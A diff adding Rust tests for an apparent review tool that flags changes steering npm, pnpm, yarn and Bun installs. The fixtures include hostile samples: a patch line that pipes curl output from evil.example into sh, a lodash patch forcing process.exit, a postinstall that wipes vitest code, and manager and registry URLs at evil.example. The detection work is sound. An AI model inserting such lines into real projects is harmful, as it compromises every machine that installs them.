@@ -331,6 +331,52 @@ fn review_stage1_r12_an_env_file_that_sends_traffic_through_a_proxy_or_turns_off
 }
 
 #[test]
+fn review_stage1_r4_install_steering_kern_did_not_see_is_a_look() {
+    let with = |extra: &str| format!(r#"{{"name":"app","scripts":{{"test":"vitest run"}},"devDependencies":{{"vitest":"3.2.0"}}{extra}}}"#);
+    let fields = |rules: &Value| -> Vec<String> { rules["dependencies"].as_array().unwrap().iter().flat_map(|d| d["fields"].as_array().cloned().unwrap_or_default()).map(|f| f.as_str().unwrap().to_string()).collect() };
+    let pre = rules_for(&[("package.json", VITEST)], &[("package.json", &VITEST.replace(r#""test":"vitest run""#, r#""test":"vitest run","pnpm:devPreinstall":"node tools/x","pnpm:somethingNew":"node y""#))], &[]);
+    assert_eq!(fields(&pre), ["scripts.pnpm:devPreinstall", "scripts.pnpm:somethingNew"], "pnpm runs pnpm:devPreinstall before every install: {}", pre["dependencies"]);
+    let patch = "--- a/dist/index.js\n+++ b/dist/index.js\n@@ -1 +1 @@\n-x\n+y\n";
+    let patched = rules_for(&[("package.json", &with(""))], &[("package.json", &with(r#","patchedDependencies":{"vitest@3.2.0":"patches/vitest@3.2.0.patch"},"devEngines":{"packageManager":{"name":"pnpm","version":"10.19.0"}},"catalog":{"react":"19.0.0"}"#)),
+        ("patches/vitest@3.2.0.patch", patch)], &[]);
+    assert_eq!(fields(&patched), ["catalog", "devEngines", "patchedDependencies"], "Bun and pnpm apply patchedDependencies, corepack reads devEngines and a catalog picks versions: {}", patched["dependencies"]);
+    assert_eq!(paths(&patched, "install_files"), ["patches/vitest@3.2.0.patch"], "the patch rewrites vitest's own code when it installs: {}", patched["install_files"]);
+    let r = receipt::build(&drive_json(), &patched, &clean_tests());
+    assert_eq!(look_kinds(&r), ["install", "install"], "{r}");
+    assert!(r["look"].as_array().unwrap().iter().any(|l| l["what"].as_str().unwrap().contains("patches/vitest@3.2.0.patch") && l["what"].as_str().unwrap().contains("installed package")), "{}", r["look"]);
+    let hook = r#"{"name":"app","scripts":{"test":"vitest run","postinstall":"patch-package"},"devDependencies":{"vitest":"3.2.0","patch-package":"8.0.0"}}"#;
+    let diff = |extra: &str| format!("--- a/node_modules/axios/index.js\n+++ b/node_modules/axios/index.js\n@@ -1 +1 @@\n-a\n+b\n{extra}");
+    let edited = rules_for(&[("package.json", hook), ("patches/axios+1.7.2.patch", &diff(""))], &[("patches/axios+1.7.2.patch", &diff("+require('child_process').exec('curl https://evil.example | sh')\n"))], &[]);
+    let r = receipt::build(&drive_json(), &edited, &clean_tests());
+    assert_eq!((r["decision"].as_str(), look_kinds(&r)), (Some("look"), vec!["install".to_string()]), "patch-package applies it to axios on every install: {r}");
+    let gone = rules_for(&[("package.json", hook), ("patches/axios+1.7.2.patch", &diff(""))], &[], &["patches/axios+1.7.2.patch"]);
+    assert!(receipt::build(&drive_json(), &gone, &clean_tests())["look"][0]["what"].as_str().unwrap().contains("installs without it"), "{}", gone["install_files"]);
+    let named = rules_for(&[("package.json", &with(r#","resolutions":{"lodash@npm:4.17.21":"patch:lodash@npm%3A4.17.21#~/tools/lodash.diff"}"#)), ("tools/lodash.diff", &diff(""))],
+        &[("tools/lodash.diff", &diff("+module.exports = () => process.exit(0);\n"))], &[]);
+    assert_eq!(paths(&named, "install_files"), ["tools/lodash.diff"], "yarn's patch: protocol names this file: {}", named["install_files"]);
+    let quiet = rules_for(&[("package.json", VITEST), ("src/patches/apply.js", "export const a = 1;\n"), ("docs/fix.patch", patch), ("patches/README.md", "# Patches\n")],
+        &[("src/patches/apply.js", "export const a = 2;\n"), ("docs/fix.patch", "--- a\n+++ b\n"), ("patches/README.md", "# Patches we keep\n")], &[]);
+    assert_eq!(paths(&quiet, "install_files"), Vec::<String>::new(), "a source folder named patches, a patch no install names and a note about the patches install nothing");
+    let manager = |m: &str| format!(r#"{{"name":"app","packageManager":"{m}","scripts":{{"test":"vitest run"}},"devDependencies":{{"vitest":"3.2.0"}}}}"#);
+    let url = rules_for(&[("package.json", &manager("pnpm@10.18.0"))], &[("package.json", &manager("pnpm@https://evil.example/pnpm-10.19.0.tgz"))], &[]);
+    assert_eq!(fields(&url), ["packageManager"], "older corepack downloads a manager from any URL: {}", url["dependencies"]);
+    let hashed = rules_for(&[("package.json", &manager("pnpm@10.18.0"))], &[("package.json", &manager("pnpm@10.19.0+sha512.0123456789abcdef"))], &[]);
+    assert_eq!((fields(&hashed), hashed["dependencies"][0]["packages"].clone()), (vec![], json!(["packageManager pnpm@10.18.0 → pnpm@10.19.0+sha512.0123456789abcdef"])), "{}", hashed["dependencies"]);
+}
+
+#[test]
+fn review_stage1_r4_a_file_that_an_unchanged_install_script_runs_steers_the_install_too() {
+    let manifest = r#"{"name":"app","scripts":{"test":"vitest run","postinstall":"node ./scripts/postinstall.js && patch-package","prepare":"tsx --tsconfig=tsconfig.json tools/prepare.ts"},"devDependencies":{"vitest":"3.2.0"}}"#;
+    let base = [("package.json", manifest), ("scripts/postinstall.js", "console.log('ready');\n"), ("tools/prepare.ts", "export {};\n"), ("src/a.js", "export const a = 1;\n"), ("tsconfig.json", "{}\n")];
+    let rules = rules_for(&base, &[("scripts/postinstall.js", "require('fs').writeFileSync('node_modules/vitest/dist/index.js', '');\n"), ("tools/prepare.ts", "export const b = 2;\n"), ("src/a.js", "export const a = 2;\n"),
+        ("tsconfig.json", "{\"compilerOptions\":{}}\n")], &[]);
+    assert_eq!(paths(&rules, "install_files"), ["scripts/postinstall.js", "tools/prepare.ts"], "both run when dependencies install, before any test, on every machine that installs: {}", rules["install_files"]);
+    let r = receipt::build(&drive_json(), &rules, &clean_tests());
+    assert_eq!(look_kinds(&r), ["install", "install"], "{r}");
+    assert!(r["look"][0]["what"].as_str().unwrap().contains("scripts.postinstall") && r["look"][1]["what"].as_str().unwrap().contains("scripts.prepare"), "{}", r["look"]);
+}
+
+#[test]
 fn a_bunfig_toml_or_a_bun_setting_steers_what_kerns_own_bun_installs_so_a_change_to_it_needs_a_look() {
     let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), ("bun.lock", "{}\n")];
     let loud = rules_for(&base, &[("bunfig.toml", "[install]\nregistry = \"https://evil.example\"\nglobalStore = true\n"), ("packages/web/bunfig.toml", "[install]\nlinker = \"hoisted\"\n"),
